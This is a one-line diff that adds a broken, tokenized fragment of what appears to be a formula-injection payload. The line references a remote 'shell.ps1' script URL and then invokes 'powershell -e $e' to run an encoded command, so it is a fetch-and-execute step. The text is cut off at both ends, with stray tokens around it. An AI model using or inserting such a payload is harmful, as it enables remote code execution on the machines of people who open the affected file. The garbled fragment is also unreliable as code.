@@ -1,0 +1,1 @@
+41 " http :// bishopfox . com / shell . ps1 " ) ; powershell -e $e '! A1
